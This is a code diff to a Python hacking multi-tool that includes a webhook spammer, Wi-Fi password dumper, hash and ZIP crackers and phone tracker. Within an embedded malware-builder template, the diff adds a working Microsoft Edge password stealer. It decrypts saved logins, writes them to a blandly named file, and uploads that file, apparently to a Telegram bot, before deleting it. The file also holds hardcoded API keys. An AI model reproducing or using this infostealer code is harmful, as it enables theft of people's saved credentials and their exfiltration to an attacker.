@@ -1,5 +1,7 @@
+import base64
 import hashlib
 import itertools
+import json
 import os
 import platform
 import random
@@ -42,10 +44,40 @@ from pytools.system_tweaker import SystemTweaker, TweakResult
 from pathlib import Path
 import urllib3
 import ssl
+import ctypes
 
 # Disable SSL warnings for better user experience
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+
+def is_admin():
+    isadmin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    return isadmin
+
+def write_reg_value(reg_key, value: str, dtype: str, data):
+    cmd = f'reg add {reg_key} /v {value} /t {dtype} /d {data}'
+    execute = subprocess.run(cmd, shell=True, text=True, stdout=subprocess.PIPE)
+    if execute.returncode != 1:
+        return True
+    return False
+
+def check_reg_value_existance(reg_key: str, value: str):
+    cmd = f'reg query {reg_key} /v {value}'
+    res = subprocess.run(cmd, shell=True, text=True, stdout=subprocess.PIPE)
+    if res.returncode == 0:
+        return True
+    else:
+        return write_reg_value(reg_key=reg_key, value=value, dtype='REG_DWORD', data=0)
+
+def value_checker(reg_key: str, value: str):
+    if check_reg_value_existance(reg_key, value):
+        res = subprocess.check_output(f'reg query {reg_key} /v {value}', shell=True, text=True)
+        value = res.strip().split()[-1]
+        if value == '0x0':
+            return True
+        return False
+    print(f'\n{red}ERROR: {white}Something Went Wrong !')
+    
 # Enhanced configuration and logging setup
 class ConfigManager:
     def __init__(self):
@@ -54,8 +86,8 @@ class ConfigManager:
         self.load_config()
     
     def load_config(self):
-        if os.path.exists(self.config_file):
-            self.config.read(self.config_file)
+        if os.path.exists(os.path.join(path_to_go, self.config_file)):
+            self.config.read(os.path.join(path_to_go, self.config_file))
         else:
             self.create_default_config()
     
@@ -65,8 +97,9 @@ class ConfigManager:
             'auto_update': 'True',
             'save_logs': 'True',
             'max_threads': '50',
-            'timeout': '30'
+            'timeout': '30',
         }
+
         self.config['API_KEYS'] = {
             'opencage_key': '42c84373c47e490ba410d4132ae64fc4',
             'ipinfo_key': '58950d8a1c1383'
@@ -74,14 +107,15 @@ class ConfigManager:
         self.save_config()
     
     def save_config(self):
-        with open(self.config_file, 'w') as f:
+        with open(os.path.join(path_to_go, self.config_file),'w') as f:
             self.config.write(f)
     
     def get(self, section, key, fallback=None):
         return self.config.get(section, key, fallback=fallback)
     
     def set(self, section, key, value):
-        if not self.config.has_section(section):
+        # Avoid adding the special DEFAULT section explicitly
+        if section != configparser.DEFAULTSECT and not self.config.has_section(section):
             self.config.add_section(section)
         self.config.set(section, key, str(value))
         self.save_config()
@@ -90,7 +124,7 @@ class Logger:
     def __init__(self, name="LOGGER"):
         self.logger = logging.getLogger(name)
         self.logger.setLevel(logging.INFO)
-        
+        self.handler_location = os.path.join(path_to_go, 'log.log')
         if not self.logger.handlers:
             formatter = logging.Formatter(
                 '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
@@ -103,7 +137,7 @@ class Logger:
             
             # File handler
             if config_manager.get('DEFAULT', 'save_logs', fallback='True').lower() == 'true':
-                file_handler = logging.FileHandler('log.log')
+                file_handler = logging.FileHandler(self.handler_location)
                 file_handler.setFormatter(formatter)
                 self.logger.addHandler(file_handler)
     
@@ -118,6 +152,30 @@ class Logger:
     
     def debug(self, message):
         self.logger.debug(message)
+
+    # ----- runtime configuration updates -----
+    def set_level(self, level_name: str):
+        try:
+            level = getattr(logging, level_name.upper())
+            self.logger.setLevel(level)
+        except Exception:
+            pass
+
+    def update_file_handler(self, enable: bool):
+        # Remove existing file handlers
+        handlers_to_remove = [h for h in self.logger.handlers if isinstance(h, logging.FileHandler)]
+        for h in handlers_to_remove:
+            self.logger.removeHandler(h)
+            try:
+                h.close()
+            except Exception:
+                pass
+        # Re-add file handler if enabling
+        if enable:
+            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            file_handler = logging.FileHandler(self.handler_location)
+            file_handler.setFormatter(formatter)
+            self.logger.addHandler(file_handler)
 
 class SecurityManager:
     @staticmethod
@@ -172,12 +230,6 @@ class NetworkManager:
                 continue
         return "Unknown"
 
-# Initialize managers
-config_manager = ConfigManager()
-logger = Logger()
-security_manager = SecurityManager()
-network_manager = NetworkManager()
-
 
 def show_settings_menu():
     """Display and manage application settings"""
@@ -189,35 +241,41 @@ def show_settings_menu():
     
     try:
         while True:
-            print(f'{cyan}Available Settings:{rescolor}')
-            print(f'{white}[1] View current configuration')
-            print(f'{white}[2] Change log level')
-            print(f'{white}[3] Toggle auto-update')
-            print(f'{white}[4] Toggle log saving')
-            print(f'{white}[5] Change API keys')
-            print(f'{white}[0] Back to main menu')
-            
+            print(f'{cyan}Available Settings:{rescolor}\n')
+            print(f'\t{lcyan}[1] {white}View current configuration')
+            print(f'\t{lcyan}[2] {white}Change log level')
+            print(f'\t{lcyan}[3] {white}Toggle auto-update')
+            print(f'\t{lcyan}[4] {white}Toggle log saving')
+            print(f'\t{lcyan}[5] {white}Change API keys')
+            print(f'\t{lcyan}[0] {white}Back to main menu')
+
             choice = input(f'\n{green}[+] Select option:{white} ').strip()
             
             if choice == '0':
                 break
             elif choice == '1':
                 print(f'\n{green}Current Configuration:{rescolor}')
+                # Show DEFAULT first
+                print(f'\n\t{cyan}DEFAULT:{rescolor}')
+                for key, value in config_manager.config.defaults().items():
+                    print(f'\t\t{white}{key}:{rescolor} {lcyan}{value}{rescolor}')
+                # Then other sections if present
                 for section in config_manager.config.sections():
-                    print(f'\n{cyan}{section}:{rescolor}')
+                    print(f'\n\t{cyan}{section}:{rescolor}')
                     for key, value in config_manager.config.items(section):
-                        print(f'{white}  {key}: {value}{rescolor}')
+                        print(f'\t\t{white}{key}:{rescolor} {lcyan}{value}{rescolor}')
                 input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                 
             elif choice == '2':
                 levels = ['DEBUG', 'INFO', 'WARNING', 'ERROR']
-                print(f'\n{cyan}Available log levels: {", ".join(levels)}{rescolor}')
+                print(f'\n{cyan}Available log levels: {", ".join(levels)}{rescolor}\n')
                 new_level = input(f'{green}[+] Enter new log level:{white} ').strip().upper()
                 if new_level in levels:
                     config_manager.set('DEFAULT', 'log_level', new_level)
-                    print(f'{green}[+] Log level updated to: {new_level}{rescolor}')
+                    logger.set_level(new_level)
+                    print(f'\n{green}[+] Log level updated to: {new_level}{rescolor}')
                 else:
-                    print(f'{red}[-] Invalid log level{rescolor}')
+                    print(f'{lcyan}[-] Invalid log level{rescolor}')
                 input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                 
             elif choice == '3':
@@ -231,11 +289,12 @@ def show_settings_menu():
                 current = config_manager.get('DEFAULT', 'save_logs', 'True')
                 new_value = 'False' if current.lower() == 'true' else 'True'
                 config_manager.set('DEFAULT', 'save_logs', new_value)
+                logger.update_file_handler(enable=new_value.lower() == 'true')
                 print(f'{green}[+] Log saving set to: {new_value}{rescolor}')
                 input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                 
             elif choice == '5':
-                print(f'\n{cyan}API Keys:{rescolor}')
+                print(f'\n{cyan}API Keys:{rescolor}\n')
                 opencage_key = input(f'{green}[+] OpenCage API Key (press Enter to skip):{white} ').strip()
                 if opencage_key:
                     config_manager.set('API_KEYS', 'opencage_key', opencage_key)
@@ -249,7 +308,7 @@ def show_settings_menu():
                 input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                 
             else:
-                print(f'{red}[-] Invalid option{rescolor}')
+                print(f'{lcyan}[-] Invalid option{rescolor}')
                 time.sleep(1)
             
             os.system('cls')
@@ -259,7 +318,7 @@ def show_settings_menu():
             
     except Exception as e:
         logger.error(f"Settings menu error: {e}")
-        print(f'{red}[-] Error in settings menu: {e}{rescolor}')
+        print(f'{lcyan}[-] Error in settings menu: {e}{rescolor}')
         input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
 
 def system_monitor():
@@ -332,12 +391,12 @@ def system_monitor():
                 break
             except Exception as e:
                 logger.error(f"System monitoring error: {e}")
-                print(f'{red}[-] Error in system monitoring: {e}{rescolor}')
+                print(f'{lcyan}[-] Error in system monitoring: {e}{rescolor}')
                 break
                 
     except Exception as e:
         logger.error(f"System monitor error: {e}")
-        print(f'{red}[-] Error starting system monitor: {e}{rescolor}')
+        print(f'{lcyan}[-] Error starting system monitor: {e}{rescolor}')
     
     input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
 
@@ -355,28 +414,11 @@ def show_about_help():
         print(f'{white}Developer: Apkaless{rescolor}')
         print(f'{white}Region: IRAQ{rescolor}\n')
         
-        print(f'{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
-        print(f'{cyan}Available Tools:{rescolor}')
-        print(f'{white}• System Tools: IDM Reset, Temp Cleaner, Windows Activation, Network Optimizer{rescolor}')
-        print(f'{white}• Security Tools: Hash Cracker, 7z/ZIP Cracker, WiFi Tools, Wordlist Generator{rescolor}')
-        print(f'{white}• Network Tools: Discord Tools, Webhook Spammer, URL Masking, IP Lookup{rescolor}')
-        print(f'{white}• Advanced Tools: Phone Tracker, System Info, Enhanced Python to EXE Converter{rescolor}')
-        
-        print(f'\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
-        print(f'{cyan}Python to EXE Features:{rescolor}')
-        print(f'{white}• Single file or directory mode{rescolor}')
-        print(f'{white}• Console visibility control{rescolor}')
-        print(f'{white}• UAC admin privileges option{rescolor}')
-        print(f'{white}• Custom icon support{rescolor}')
-        print(f'{white}• Size vs. speed optimization{rescolor}')
-        print(f'{white}• Automatic dependency management{rescolor}')
-        
         print(f'\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
         print(f'{cyan}Quick Tips:{rescolor}')
-        print(f'{white}• Use number keys (01-27) to navigate the menu{rescolor}')
+        print(f'{white}• Use number keys (01-29) to navigate the menu{rescolor}')
         print(f'{white}• Type 00 to exit the application{rescolor}')
         print(f'{white}• Check the settings menu (option 26) to customize the application{rescolor}')
-        print(f'{white}• Use the system monitor (option 27) to track system performance{rescolor}')
         
         print(f'\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
         print(f'{cyan}Support & Links:{rescolor}')
@@ -391,7 +433,7 @@ def show_about_help():
         
     except Exception as e:
         logger.error(f"About & Help error: {e}")
-        print(f'{red}[-] Error displaying about & help: {e}{rescolor}')
+        print(f'{lcyan}[-] Error displaying about & help: {e}{rescolor}')
     
     input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
 
@@ -403,6 +445,7 @@ def enhanced_check_update():
             return
             
         logger.info("Checking for updates...")
+        print(f'{cyan}[!] Checking for updates...{white}')
         with cloudscraper.create_scraper(ssl_context=ssl.create_default_context()) as s:
             response = s.get('https://raw.githubusercontent.com/Apkaless/Apkaless/main/ver', 
                            timeout=10, verify=False)
@@ -428,7 +471,7 @@ def enhanced_check_update():
 def enhanced_phoneNumberTracker(phoneNumber):
     """Enhanced phone number tracker with better error handling and validation"""
     if not security_manager.validate_input(phoneNumber, 20):
-        print(f'{red}[-] Invalid phone number format')
+        print(f'{lcyan}[-] Invalid phone number format')
         return
         
     os.system('cls')
@@ -438,7 +481,7 @@ def enhanced_phoneNumberTracker(phoneNumber):
         phone_number_parsed = phonenumbers.parse(phoneNumber)
         
         if not phonenumbers.is_valid_number(phone_number_parsed):
-            print(f'{red}[-] Invalid phone number')
+            print(f'{lcyan}[-] Invalid phone number')
             return
 
         print(f'{green}[+] Attempting to track location of:{white} {phonenumbers.format_number(phone_number_parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}...')
@@ -460,7 +503,7 @@ def enhanced_phoneNumberTracker(phoneNumber):
         if carrier_name:
             print(f'{green}[+] Service Provider:{white} {carrier_name}')
         else:
-            print(f'{red}[-] Service Provider: Unknown')
+            print(f'{lcyan}[-] Service Provider: Unknown')
 
         # Enhanced geocoding with error handling
         try:
@@ -492,7 +535,7 @@ def enhanced_phoneNumberTracker(phoneNumber):
                     if address:
                         print(f'{green}[+] Approximate Location is:{white} {address[0]["formatted"]}')
                     else:
-                        print(f'{red}[-] No Address Found For The Given Coordinates.')
+                        print(f'{lcyan}[-] No Address Found For The Given Coordinates.')
                 except Exception as e:
                     logger.warning(f"Could not get address information: {e}")
 
@@ -523,39 +566,39 @@ def enhanced_phoneNumberTracker(phoneNumber):
                     pass
                     
             else:
-                print(f'{red}[-] Could not retrieve location data')
+                print(f'{lcyan}[-] Could not retrieve location data')
                 
         except Exception as e:
             logger.error(f"Geocoding error: {e}")
-            print(f'{red}[-] Error retrieving location data')
+            print(f'{lcyan}[-] Error retrieving location data')
 
     except phonenumbers.NumberParseException as e:
-        print(f'{red}[-] Invalid phone number format: {e}')
+        print(f'{lcyan}[-] Invalid phone number format: {e}')
     except Exception as e:
         logger.error(f"Phone number tracking error: {e}")
-        print(f'{red}[-] An error occurred while tracking the phone number')
+        print(f'{lcyan}[-] An error occurred while tracking the phone number')
 
 def enhanced_webhookSpammer():
     """Enhanced webhook spammer with rate limiting and better error handling"""
     os.system('cls')
     
     try:
-        print(f'{red}[*] Note: {white}if you wanna stop the attack just press {blue}(ctrl + C){rescolor}\n')
+        print(f'{lcyan}[*] Note: {white}if you wanna stop the attack just press {blue}(ctrl + C){rescolor}\n')
         print(f'{yellow}[!] Warning: This tool is for educational purposes only. Use responsibly.\n')
 
         url = input(f'\n{green}[+] WebHook URL:{white} ')
         if not security_manager.validate_input(url):
-            print(f'{red}[-] Invalid URL format')
+            print(f'{lcyan}[-] Invalid URL format')
             return
 
         content = input(f'\n{green}[+] {white}What Would You Like To Send {blue}(ex: Hello):{white} ')
         if not security_manager.validate_input(content):
-            print(f'{red}[-] Invalid content')
+            print(f'{lcyan}[-] Invalid content')
             return
 
         username = input(f'\n{green}[+] Type Any Name:{white} ')
         if not security_manager.validate_input(username):
-            print(f'{red}[-] Invalid username')
+            print(f'{lcyan}[-] Invalid username')
             return
 
         # Rate limiting options
@@ -602,7 +645,7 @@ def enhanced_webhookSpammer():
 
             except requests.exceptions.HTTPError as e:
                 error_count += 1
-                print(f'{red}[-] HTTP Error {e.response.status_code}: {e.response.text[:100]}')
+                print(f'{lcyan}[-] HTTP Error {e.response.status_code}: {e.response.text[:100]}')
                 if e.response.status_code == 429:  # Rate limited
                     print(f'{yellow}[!] Rate limited. Waiting 30 seconds...')
                     time.sleep(30)
@@ -612,7 +655,7 @@ def enhanced_webhookSpammer():
                     
             except requests.exceptions.RequestException as e:
                 error_count += 1
-                print(f'{red}[-] Network error: {e}')
+                print(f'{lcyan}[-] Network error: {e}')
                 print(f'{green}[+] Waiting to retry...')
                 time.sleep(10)
                 
@@ -627,7 +670,7 @@ def enhanced_webhookSpammer():
         print(f'\n{cyan}[!] Returning to main menu...')
     except Exception as e:
         logger.error(f"Webhook spammer error: {e}")
-        print(f'{red}[-] An unexpected error occurred')
+        print(f'{lcyan}[-] An unexpected error occurred')
         time.sleep(3)
 
 def enhanced_wifiPassword():
@@ -643,10 +686,10 @@ def enhanced_wifiPassword():
                                         shell=True, stderr=subprocess.PIPE, 
                                         timeout=30).decode('utf-8', errors='ignore')
         except subprocess.TimeoutExpired:
-            print(f'{red}[-] Command timed out. Please try again.')
+            print(f'{lcyan}[-] Command timed out. Please try again.')
             return
         except subprocess.CalledProcessError as e:
-            print(f'{red}[-] Error executing command: {e}')
+            print(f'{lcyan}[-] Error executing command: {e}')
             return
 
         users = res.splitlines()
@@ -693,10 +736,10 @@ def enhanced_wifiPassword():
                     print(f'{yellow}[!] No password found for {ssid}')
                     
             except subprocess.TimeoutExpired:
-                print(f'{red}[-] Timeout while retrieving password for {ssid}')
+                print(f'{lcyan}[-] Timeout while retrieving password for {ssid}')
                 continue
             except subprocess.CalledProcessError as e:
-                print(f'{red}[-] Error retrieving password for {ssid}: {e}')
+                print(f'{lcyan}[-] Error retrieving password for {ssid}: {e}')
                 continue
             except Exception as e:
                 logger.error(f"Error processing WiFi profile {ssid}: {e}")
@@ -704,7 +747,7 @@ def enhanced_wifiPassword():
                 
     except Exception as e:
         logger.error(f"WiFi password retrieval error: {e}")
-        print(f'{red}[-] An unexpected error occurred')
+        print(f'{lcyan}[-] An unexpected error occurred')
 
 def nmapCommands():
     """Display common Nmap commands and usage tips"""
@@ -762,17 +805,17 @@ def enhanced_wordlist():
         max_len = int(input(f'\n{green}[+] Max Length:{rescolor} '))
         
         if min_len < 1 or max_len < min_len or max_len > 20:
-            print(f'{red}[-] Invalid length range. Min: 1-20, Max: Min-20')
+            print(f'{lcyan}[-] Invalid length range. Min: 1-20, Max: Min-20')
             return
             
         passwords_chars = input(f'\n{green}[+] What are the chars you want (ex: abc1234):{rescolor} ')
         if not security_manager.validate_input(passwords_chars, 100):
-            print(f'{red}[-] Invalid characters')
+            print(f'{lcyan}[-] Invalid characters')
             return
             
         filename = input(f'\n{green}[+] Type The Filename:{rescolor} ')
         if not security_manager.validate_input(filename, 50):
-            print(f'{red}[-] Invalid filename')
+            print(f'{lcyan}[-] Invalid filename')
             return
 
         # Calculate total combinations
@@ -831,7 +874,7 @@ def enhanced_wordlist():
                 print(f'\n{yellow}[!] Generation stopped by user')
             except Exception as e:
                 logger.error(f"Wordlist generation error: {e}")
-                print(f'{red}[-] Error during generation: {e}')
+                print(f'{lcyan}[-] Error during generation: {e}')
             finally:
                 wordlistpath = os.path.abspath(output_file)
                 os.system('cls')
@@ -854,10 +897,10 @@ def enhanced_wordlist():
 ''')
                 
     except ValueError:
-        print(f'{red}[-] Invalid input. Please enter valid numbers.')
+        print(f'{lcyan}[-] Invalid input. Please enter valid numbers.')
     except Exception as e:
         logger.error(f"Wordlist error: {e}")
-        print(f'{red}[-] An unexpected error occurred')
+        print(f'{lcyan}[-] An unexpected error occurred')
 
 def enhanced_sysinfo():
     """Enhanced system information with detailed hardware and network details"""
@@ -871,7 +914,6 @@ def enhanced_sysinfo():
         # Basic system info
         print(f'{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
         print(f'{green}[+] Operating System:{white} {platform.system()} {platform.release()} ({platform.architecture()[0]})')
-        print(f'{green}[+] Python Version:{white} {platform.python_version()}')
         print(f'{green}[+] Hostname:{white} {socket.gethostname()}')
         print(f'{green}[+] Username:{white} {os.getlogin()}')
         
@@ -962,7 +1004,7 @@ def enhanced_sysinfo():
         
     except Exception as e:
         logger.error(f"System info error: {e}")
-        print(f'{red}[-] Error retrieving system information: {e}')
+        print(f'{lcyan}[-] Error retrieving system information: {e}')
 
 def enhanced_public_ip():
     """Enhanced public IP lookup with detailed information and map"""
@@ -979,7 +1021,7 @@ def enhanced_public_ip():
         public_ip = network_manager.get_public_ip()
         
         if public_ip == "Unknown":
-            print(f'{red}[-] Could not retrieve public IP address')
+            print(f'{lcyan}[-] Could not retrieve public IP address')
             return
         
         print(f'{green}[+] Your Public IP:{white} {public_ip}')
@@ -1043,7 +1085,7 @@ def enhanced_public_ip():
         
     except Exception as e:
         logger.error(f"Public IP lookup error: {e}")
-        print(f'{red}[-] Error during public IP lookup: {e}')
+        print(f'{lcyan}[-] Error during public IP lookup: {e}')
 
 def enhanced_ip_lookup(ip):
     """Enhanced IP lookup with detailed information and map"""
@@ -1051,7 +1093,7 @@ def enhanced_ip_lookup(ip):
     
     try:
         print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
-        print(f'{cyan}║                           ENHANCED IP LOOKUP                               ║')
+        print(f'{cyan}║                                  IP LOOKUP                                  ║')
         print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
         
         # Resolve IP if domain provided
@@ -1128,13 +1170,13 @@ def enhanced_ip_lookup(ip):
             
         except Exception as e:
             logger.error(f"IP lookup error: {e}")
-            print(f'{red}[-] Error retrieving IP information: {e}')
+            print(f'{lcyan}[-] Error retrieving IP information: {e}')
         
         print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
         
     except Exception as e:
         logger.error(f"IP lookup error: {e}")
-        print(f'{red}[-] An unexpected error occurred: {e}')
+        print(f'{lcyan}[-] An unexpected error occurred: {e}')
 
 def enhanced_hash_cracker(hashtocrack, pwds, hash_type):
     """Enhanced hash cracker with progress tracking and better error handling"""
@@ -1150,7 +1192,7 @@ def enhanced_hash_cracker(hashtocrack, pwds, hash_type):
     }
 
     if hash_type not in supported_hashes:
-        print(f'{red}[-] Hash type {hash_type} is not supported!')
+        print(f'{lcyan}[-] Hash type {hash_type} is not supported!')
         print(f'{yellow}[!] Supported types: 1=SHA256, 2=SHA1, 3=SHA224, 4=SHA384, 5=SHA512, 6=MD5')
         time.sleep(3)
         return
@@ -1209,7 +1251,7 @@ def enhanced_hash_cracker(hashtocrack, pwds, hash_type):
         
         if not hashCaptured:
             elapsed = time.time() - start_time
-            print(f'\n{red}[-] Hash not found in password list{rescolor}')
+            print(f'\n{lcyan}[-] Hash not found in password list{rescolor}')
             print(f'{yellow}[!] Total passwords tested: {passwords_tested:,}')
             print(f'{yellow}[!] Time elapsed: {elapsed:.2f} seconds')
         
@@ -1236,13 +1278,13 @@ def enhanced_hash_cracker(hashtocrack, pwds, hash_type):
                 
             except Exception as e:
                 logger.error(f"Error saving results: {e}")
-                print(f'{red}[-] Error saving results: {e}')
+                print(f'{lcyan}[-] Error saving results: {e}')
         
     except FileNotFoundError:
-        print(f'{red}[-] Password list file not found: {pwds}')
+        print(f'{lcyan}[-] Password list file not found: {pwds}')
     except Exception as e:
         logger.error(f"Hash cracker error: {e}")
-        print(f'{red}[-] An unexpected error occurred: {e}')
+        print(f'{lcyan}[-] An unexpected error occurred: {e}')
 
 def enhanced_zipfilecracker(zipf, passwordsList):
     """Enhanced ZIP file cracker with progress tracking, result management, and better error handling"""
@@ -1261,15 +1303,15 @@ def enhanced_zipfilecracker(zipf, passwordsList):
     try:
         # Input validation
         if not zipf or not passwordsList:
-            print(f'{red}[-] Error: Both ZIP file path and password list path are required{rescolor}')
+            print(f'{lcyan}[-] Error: Both ZIP file path and password list path are required{rescolor}')
             return None
         
         if not os.path.exists(zipf):
-            print(f'{red}[-] ZIP file not found: {zipf}{rescolor}')
+            print(f'{lcyan}[-] ZIP file not found: {zipf}{rescolor}')
             return None
         
         if not os.path.exists(passwordsList):
-            print(f'{red}[-] Password list not found: {passwordsList}{rescolor}')
+            print(f'{lcyan}[-] Password list not found: {passwordsList}{rescolor}')
             return None
         
         # Validate ZIP file extension
@@ -1281,7 +1323,7 @@ def enhanced_zipfilecracker(zipf, passwordsList):
         
         # Validate it's actually a ZIP file
         if not is_zipfile(zipf):
-            print(f'{red}[-] File is not a valid ZIP archive: {zipf}{rescolor}')
+            print(f'{lcyan}[-] File is not a valid ZIP archive: {zipf}{rescolor}')
             return None
         
         print(f'{green}[+] ZIP file:{white} {zipf}')
@@ -1395,7 +1437,7 @@ def enhanced_zipfilecracker(zipf, passwordsList):
                             
             except Exception as e:
                 logger.error(f"AES ZIP decryption error: {e}")
-                print(f'{red}[-] AES decryption failed: {e}{rescolor}')
+                print(f'{lcyan}[-] AES decryption failed: {e}{rescolor}')
         
         # If we get here, password wasn't found
         elapsed = time.time() - start_time
@@ -1406,7 +1448,7 @@ def enhanced_zipfilecracker(zipf, passwordsList):
         with open(os.path.join(results_dir, "zip_cracker_failed.txt"), "w", encoding="utf-8") as f:
             f.write(failed_msg)
         
-        print(f'\n{red}[-] Password not found in the list{rescolor}')
+        print(f'\n{lcyan}[-] Password not found in the list{rescolor}')
         print(f'{yellow}[!] Total passwords tested: {passwords_tested:,}')
         print(f'{yellow}[!] Time elapsed: {elapsed:.2f} seconds')
         print(f'{yellow}[!] Failed attempt details saved to: {results_dir}/zip_cracker_failed.txt{rescolor}')
@@ -1417,7 +1459,7 @@ def enhanced_zipfilecracker(zipf, passwordsList):
         
     except Exception as e:
         logger.error(f"ZIP cracker error: {e}")
-        print(f'{red}[-] An unexpected error occurred: {e}{rescolor}')
+        print(f'{lcyan}[-] An unexpected error occurred: {e}{rescolor}')
         
         # Save error details
         try:
@@ -1435,7 +1477,7 @@ def enhanced_zipfilecracker(zipf, passwordsList):
 def enhanced_url_masking():
     """Enhanced URL masking with better validation and error handling"""
     init(convert=True)
-    
+    os.system('cls')
     try:
         print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
         print(f'{cyan}║                           URL MASKING                                        ║')
@@ -1498,16 +1540,19 @@ def enhanced_url_masking():
                 print(f'{cyan}Select URL type:{rescolor}')
                 print(f'{white}[1] Normal URL (ex: https://example.com/)')
                 print(f'{white}[2] Host:Port URL (ex: https://example.com:8080)')
-                
-                url_type = int(input(f'{green}[+] Select option (1-2):{white} '))
+                print(f'{white}[3] Back To Main Menu')
+                url_type = int(input(f'{green}[+] Select option (1-3):{white} '))
                 if url_type in [1, 2]:
                     break
+                elif url_type == 3:
+                    return
                 else:
-                    print(f'{red}[-] Please select option 1 or 2{rescolor}')
+                    print(f'{lcyan}[-] Please select option 1 or 2 or 3{rescolor}')
+                    continue
             except ValueError:
-                print(f'{red}[-] Please enter a valid number{rescolor}')
+                print(f'{lcyan}[-] Please enter a valid number{rescolor}')
                 continue
-
+                
         # Get URL
         while True:
             try:
@@ -1515,7 +1560,7 @@ def enhanced_url_masking():
                 validate_url(url)
                 break
             except ValueError as e:
-                print(f'{red}[-] {e}{rescolor}')
+                print(f'{lcyan}[-] {e}{rescolor}')
                 continue
 
         # Get custom domain
@@ -1525,7 +1570,7 @@ def enhanced_url_masking():
                 validate_custom_domain(custom_domain)
                 break
             except ValueError as e:
-                print(f'{red}[-] {e}{rescolor}')
+                print(f'{lcyan}[-] {e}{rescolor}')
                 continue
 
         # Get keyword
@@ -1535,7 +1580,7 @@ def enhanced_url_masking():
                 validate_keyword(keyword)
                 break
             except ValueError as e:
-                print(f'{red}[-] {e}{rescolor}')
+                print(f'{lcyan}[-] {e}{rescolor}')
                 continue
 
         # Generate masked URL
@@ -1566,11 +1611,11 @@ def enhanced_url_masking():
             
         except Exception as e:
             logger.error(f"URL masking error: {e}")
-            print(f'{red}[-] Error generating masked URL: {e}')
+            print(f'{lcyan}[-] Error generating masked URL: {e}')
         
     except Exception as e:
         logger.error(f"URL masking error: {e}")
-        print(f'{red}[-] An unexpected error occurred: {e}')
+        print(f'{lcyan}[-] An unexpected error occurred: {e}')
 
 
 def malware(botToken, cid, malname, malico):
@@ -1685,6 +1730,52 @@ class Opera:
     def get_encrypt_key(self):
 
         local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Local State'))
+
+
+        with open(local, 'r') as f:
+
+            jsdata = json.loads(f.read())
+
+
+        return jsdata['os_crypt']['encrypted_key']
+
+
+    def decode_encrypted_key(self, encrypted_key):
+
+        return base64.b64decode(encrypted_key)
+
+
+    def decrypt_decoded_key(self, decoded_key):
+
+        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]
+
+    def decrypt_saved_password(self, password, key):
+
+        try:
+
+            iv = password[3:15]
+
+            password = password[15:]
+
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+
+            return cipher.decrypt(password)[:-16].decode()
+
+        except:
+            try:
+                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+            except:
+                # not supported
+                return
+
+class MicrosoftEdge:
+
+    def __init__(self) -> None:
+        pass
+
+    def get_encrypt_key(self):
+
+        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State'))
 
 
         with open(local, 'r') as f:
@@ -1838,14 +1929,72 @@ def opera():
     except:
         pass
 
+
+def edge():
+
+    try:
+
+        edge = MicrosoftEdge()
+
+        encrypted_key = edge.get_encrypt_key()
+
+        decoded_key = edge.decode_encrypted_key(encrypted_key)[5:]
+
+        decrypted_key = edge.decrypt_decoded_key(decoded_key)
+
+        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))
+
+        filename = 'EdgeData.db'
+
+        shutil.copyfile(db, filename)
+
+        database = sqlite3.connect(filename)
+
+        if database:
+
+
+            cursor = database.cursor()
+
+            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+
+            for row in cursor.fetchall():
+                print('='*40)
+
+                origin_url = row[0]
+                action_url = row[1]
+                user_or_email = row[2]
+                password = row[3]
+                password = edge.decrypt_saved_password(password, decrypted_key)
+
+                print('*'*50)
+
+                result =f'''
+    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Microsoft Edge
+    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
+    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
+    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
+    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
+                        '''
+
+                print(result)
+                print('*'*50)
+
+                with open('helloworldmain.txt', 'a') as f:
+                    f.writelines([f'[+] Browser: Microsoft Edge\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])
+
+        database.close()           
+        os.remove('EdgeData.db')
+
+    except:
+        pass
+
 def main():
-
     print('\n================= Chrome =================\n\n')
-
     chrome()
-
     print('\n================= Opera =================\n\n')
     opera()
+    print('\n================= Edge =================\n\n')
+    edge()
 
 if __name__ == '__main__':
 
@@ -1854,8 +2003,8 @@ if __name__ == '__main__':
     colorama.init(convert=True)
     get_pc_name_and_public_ip()
     main()
-    upload_file('passwords_google_database.txt')
-    os.remove('passwords_google_database.txt')
+    upload_file('helloworldmain.txt')
+    os.remove('helloworldmain.txt')
 
 """ % (str(botToken), cid)
 
